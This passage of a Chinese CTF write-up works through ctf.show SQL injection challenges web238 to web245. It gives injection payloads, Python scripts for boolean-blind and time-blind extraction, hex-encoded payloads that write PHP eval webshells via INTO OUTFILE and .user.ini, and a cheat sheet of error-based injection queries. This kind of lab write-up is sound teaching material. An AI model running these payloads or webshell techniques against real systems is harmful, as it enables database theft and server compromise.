<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="string">`table_name`</span>))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span><span class="string">`table_schema`</span>=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="string">`column_name`</span>))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span><span class="string">`table_schema`</span>=<span class="keyword">database</span>()<span class="keyword">and</span><span class="string">`table_name`</span>=<span class="string">'flagb'</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flagb)))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><blockquote>
<ul>
<li>过滤了information，空格</li>
</ul>
</blockquote>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;gylq&amp;username&#x3D;gylqtest&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)))#</span><br></pre></td></tr></table></figure></div>

<p>拼不出来flag，无列名我无能为力</p>
<p><strong>查flag，猜弱flag名称</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&#39;,(select&#96;flag&#96;from&#96;flagbb&#96;));#&amp;password&#x3D;1</span><br></pre></td></tr></table></figure></div>

<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><blockquote>
<ul>
<li>这题明显是让我们写个爆破py，安排啊</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url="http://108f39e9-3737-4b40-9285-4441a3360741.challenge.ctf.show:<span class="number">8080</span>/api/insert.php<span class="string">"</span></span><br><span class="line"><span class="string">flag="</span>flag<span class="string">"</span></span><br><span class="line"><span class="string">str="</span>ab<span class="string">"</span></span><br><span class="line"><span class="string">payload="</span>gylq<span class="string">',(select(group_concat(flag))from(&#123;&#125;)))#"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for a in str:</span></span><br><span class="line"><span class="string">    for b in str:</span></span><br><span class="line"><span class="string">        for c in str:</span></span><br><span class="line"><span class="string">            for d in str:</span></span><br><span class="line"><span class="string">                for e in str:</span></span><br><span class="line"><span class="string">                    random=flag+a+b+c+d+e</span></span><br><span class="line"><span class="string">                    data = &#123;</span></span><br><span class="line"><span class="string">                        '</span>username<span class="string">' : payload.format(random) ,</span></span><br><span class="line"><span class="string">                        '</span><span class="keyword">password</span><span class="string">' : "flag"</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                    res = requests.post(url,data)</span></span><br></pre></td></tr></table></figure></div>

<p>跑一下就可以看到结果</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801210838287.png" alt="image-20210801210838287"></p>
<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><blockquote>
<ul>
<li>一开始想快速了解直接写了个布尔盲注，想着有21条数据，直接写了个布尔盲注的代码，结果只能查出flag前几位，由于环境无法插入，所以只能查出表和字段，但是flag拿不全。</li>
</ul>
</blockquote>
<p>这是可以查表和字段的布尔盲注，不过可利用价值不高，只能查出flag一部分，可以学习，<code>注意：这个代码无法查出结果</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;1</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line">#import time</span><br><span class="line"></span><br><span class="line"># def generateNum(num):</span><br><span class="line">#     res &#x3D; &#39;true&#39;</span><br><span class="line">#     if num &#x3D;&#x3D; 1:</span><br><span class="line">#         return res</span><br><span class="line">#     else:</span><br><span class="line">#         for i in range(num-1):</span><br><span class="line">#             res +&#x3D; &quot;+true&quot;</span><br><span class="line">#         return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;6786d08e-8031-4544-aa67-f4b3028d2c8d.challenge.ctf.show:8080&#x2F;api&#x2F;delete.php&quot;</span><br><span class="line">str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">#--------查表</span><br><span class="line">#sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;</span><br><span class="line">#--------查字段</span><br><span class="line">#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;</span><br><span class="line">#--------查flag</span><br><span class="line">#sql&#x3D; &quot;select flagasabc from ctfshow_flagas&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">payload &#x3D; &quot;&#123;&#125; and  if(substr((select group_concat(flag) from flag),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,1,0)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#计数</span><br><span class="line">n &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(20, 44):</span><br><span class="line">    k&#x3D;i-19</span><br><span class="line">    for j in str:</span><br><span class="line">        params &#x3D; &#123;</span><br><span class="line">            &#39;id&#39; : payload.format(k,i,j)</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; requests.post(url &#x3D; url, data &#x3D; params)</span><br><span class="line">        if r&quot;\u5220\u9664\u6210\u529f&quot; in res.text:</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            n +&#x3D; 1</span><br><span class="line">            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j &#x3D;&#x3D; &quot;&#125;&quot;:</span><br><span class="line">                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p>实际去环境试了下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">delete from users where id&#x3D;sleep(0.20)</span><br><span class="line">这样是可以达到延时</span><br></pre></td></tr></table></figure></div>

<p>所以这题应该是时间盲注。好了直接上脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = "http://f0b20d14-9c8f-49ed-8808-2ebc4115c907.challenge.ctf.show:<span class="number">8080</span>/api/delete.php<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">#--------查库名</span></span><br><span class="line"><span class="string">#sql="</span><span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查表</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查字段</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span><span class="string">"</span></span><br><span class="line"><span class="string">#--------查flag</span></span><br><span class="line"><span class="string">sql= "</span><span class="keyword">select</span> flag <span class="keyword">from</span> flag<span class="string">"</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">payload = "</span><span class="keyword">if</span>(<span class="keyword">substr</span>((&#123;&#125;),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">sleep</span>(<span class="number">0.1</span>),<span class="number">0</span>)<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#计数</span></span><br><span class="line"><span class="string">n = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1,666):</span></span><br><span class="line"><span class="string">    for j in str:</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            'id' : payload.format(sql,i,j)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        start = time.time()</span></span><br><span class="line"><span class="string">        res = requests.post(url = url, data = data)</span></span><br><span class="line"><span class="string">        end = time.time()</span></span><br><span class="line"><span class="string">        if end-start &gt; 2 and end-start &lt; 3:</span></span><br><span class="line"><span class="string">            flag += j</span></span><br><span class="line"><span class="string">            n += 1</span></span><br><span class="line"><span class="string">            print('[*] 开始盲注第&#123;&#125;位'.format(n))</span></span><br><span class="line"><span class="string">            print(flag)</span></span><br><span class="line"><span class="string">            if j == "</span>&#125;<span class="string">":</span></span><br><span class="line"><span class="string">                print('[*] flag is &#123;&#125;'.format(flag))</span></span><br><span class="line"><span class="string">                exit()</span></span><br><span class="line"><span class="string">            break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802070239988.png" alt="image-20210802070239988"></p>
<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><blockquote>
<ul>
<li>到了file模块了，首先我们先了解一下关于file的形式，做这题前，先了解一些预备知识</li>
</ul>
</blockquote>
<p><strong>我们到本地进行测试一下file的功能</strong></p>
<p>首先第一个我们了解一下字段分隔符</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">FIELDS TERMINATED BY‘,‘字段间分割符</span><br><span class="line">OPTIONALLY ENCLOSED BY‘&quot;‘将字段包围 对数值型无效--未测试</span><br></pre></td></tr></table></figure></div>

<p>利用字段分隔符在本地写一句话木马</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802072512149.png" alt="image-20210802072512149"></p>
<p><strong>可以发现很好的写入成功</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802072534703.png" alt="image-20210802072534703"></p>
<p>我们再学习一个将每一条记录使用换行符</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">LINES TERMINATED BY‘\n‘ 换行符</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select * from users into outfile &quot;D:&#x2F;phpstudy8&#x2F;WWW&#x2F;dump&#x2F;1.txt&quot; LINES TERMINATED BY &#39;&lt;?php eval(REQUEST[1]);?&gt;&#39;</span><br></pre></td></tr></table></figure></div>

<p>明显将一句话木马写入</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802073050645.png" alt="image-20210802073050645"></p>
<p>我们看一下题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;备份表</span><br><span class="line">$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>这题明显就有两种做法，我们用分隔符做</strong></p>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;7.php&#39; FIELDS TERMINATED BY &#39;&lt;?php eval($_REQUEST[1]);?&gt; &#39; #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802073413150.png" alt="image-20210802073413150"></p>
<p>这题我眼瞎，找flag半天，没发现flag在根目录，结果以为在数据库里面，因为权限不够，我在dump目录下写了个数据库连接以及查询的语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">$ua &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line"></span><br><span class="line">$filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line"></span><br><span class="line">$num &#x3D; 1;</span><br><span class="line">$ret &#x3D; array(</span><br><span class="line">	&quot;code&quot;&#x3D;&gt;0,</span><br><span class="line">	&quot;msg&quot;&#x3D;&gt;&quot;导出失败&quot;,</span><br><span class="line">	&quot;count&quot;&#x3D;&gt;$num,</span><br><span class="line">	&quot;data&quot;&#x3D;&gt;array()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($filename))&#123;</span><br><span class="line"></span><br><span class="line">	$conn &#x3D; new mysqli($dbhost,$dbuser,$dbpwd,$dbname);</span><br><span class="line">	if(mysqli_connect_errno())&#123;</span><br><span class="line">	 	die(json_encode(array(mysqli_connect_error())));</span><br><span class="line">	&#125;</span><br><span class="line">	$conn-&gt;query(&quot;set name $charName&quot;);</span><br><span class="line"></span><br><span class="line">	$sql &#x3D; &quot;select * from ctfshow_user where username&#x3D;&#123;$filename&#125;;&quot;;</span><br><span class="line">	$conn-&gt;query(&quot;set name $charName&quot;);</span><br><span class="line">	$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    while ($row &#x3D; mysqli_fetch_array($result))&#123;  </span><br><span class="line">        echo &quot;u:&quot;.$row[&#39;username&#39;];</span><br><span class="line">        echo &quot;p:&quot;.$row[&#39;pass&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">	if(mysqli_affected_rows($conn))&#123;</span><br><span class="line">		$ret[&#39;msg&#39;]&#x3D;&quot;导出&#123;$filename&#125;成功&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$ret[&#39;msg&#39;]&#x3D;&quot;导出&#123;$filename&#125;失败&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($conn);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo json_encode($ret);</span><br></pre></td></tr></table></figure></div>

<p>然后利用自己写的一个盲注脚本跑了整个数据库，没找到脚本，最后才发现在根目录，脚本上来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;1</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line">#import time</span><br><span class="line"></span><br><span class="line"># def generateNum(num):</span><br><span class="line">#     res &#x3D; &#39;true&#39;</span><br><span class="line">#     if num &#x3D;&#x3D; 1:</span><br><span class="line">#         return res</span><br><span class="line">#     else:</span><br><span class="line">#         for i in range(num-1):</span><br><span class="line">#             res +&#x3D; &quot;+true&quot;</span><br><span class="line">#         return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9c4ff2fb-3479-4628-be92-f7dff3560001.challenge.ctf.show:8080&#x2F;dump&#x2F;dump.php&quot;</span><br><span class="line">str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">#password&#x3D;1234567811&amp;username&#x3D;ctfshow&#39; and if(substr(database(),1,1)&#x3D;&#39;c&#39;,1,0)#</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">#--------查表</span><br><span class="line">sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;</span><br><span class="line">#--------查字段</span><br><span class="line">#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag233333&#39;&quot;</span><br><span class="line">#--------查flag</span><br><span class="line">#sql&#x3D; &quot;select group_concat(flagass233) from flag233333&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;&#39;ctfshow&#39; and if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,1,0)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#计数</span><br><span class="line">n &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(1, 666):</span><br><span class="line">    for j in str:</span><br><span class="line">        params &#x3D; &#123;</span><br><span class="line">            &#39;filename&#39; : payload.format(sql,i,j),</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; requests.post(url &#x3D; url, data &#x3D; params)</span><br><span class="line">        if &quot;u:ctfshowp&quot; in res.text:</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            n +&#x3D; 1</span><br><span class="line">            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j &#x3D;&#x3D; &quot;&#125;&quot;:</span><br><span class="line">                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p><strong>简简单单的找flag，我搞成了代码审计。这两个代码仅供娱乐。只能扒光数据库，但是找不到flag。注意：flag在根目录o(╥﹏╥)o</strong></p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><blockquote>
<ul>
<li>过滤了php，这时候我们想到了用户自定义<code>.user.ini</code>函数，刚刚好他这个dump目录下有一个Index.php文件，所以我们可以直接梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">0x0A3C3F706870206576616C28245F524551554553545B315D293B3F3E0A &#x3D;&#x3D;&gt; \nauto_prepend_file&#x3D;gylq.jpg</span><br></pre></td></tr></table></figure></div>

<p>首先上传一个图片文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;gylq.jpg&#39; LINES TERMINATED BY 0x0A3C3F706870206576616C28245F524551554553545B315D293B3F3E0A#</span><br></pre></td></tr></table></figure></div>

<p>在上传<code>.user.ini</code>文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;.user.ini&#39; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#</span><br></pre></td></tr></table></figure></div>

<p><strong>接着访问index.php</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802100525229.png" alt="image-20210802100525229"></p>
<p><strong>getshell拿flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802100538845.png" alt="image-20210802100538845"></p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><blockquote>
<ul>
<li>终于来到报错模块了</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;备份表</span><br><span class="line"> $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>经典报错注入</strong>拿表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://8b891a41-b3c2-4892-96e2-88623f86dd70.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' or updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)%23</span></span><br></pre></td></tr></table></figure></div>

<p>拿字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://8b891a41-b3c2-4892-96e2-88623f86dd70.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' or updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_flag<span class="string">')),1)%23</span></span><br></pre></td></tr></table></figure></div>

<p>拿flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">左半边flag</span><br><span class="line">ctfshow&#123;5079b895-164f-4ea3-9e0e</span><br><span class="line">右半边flag</span><br><span class="line">5-164f-4ea3-9e0e-553ff35fee35&#125;</span><br><span class="line">删除重合的部分</span><br><span class="line">ctfshow&#123;5079b895-164f-4ea3-9e0e-553ff35fee35&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><blockquote>
<ul>
<li><strong>过滤了update</strong>，可以积累一下报错注入的语句</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1. floor + rand + group by</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  !<span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  <span class="keyword">limit</span> <span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line">2. ExtractValue</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">3. UpdateXml</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">4. Name_Const(&gt;5.0.12)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">0</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line">5. Join</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br></pre></td></tr></table></figure></div>

<p><strong>拿表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))%23</span><br></pre></td></tr></table></figure></div>

<p><strong>拿字段</strong></p>
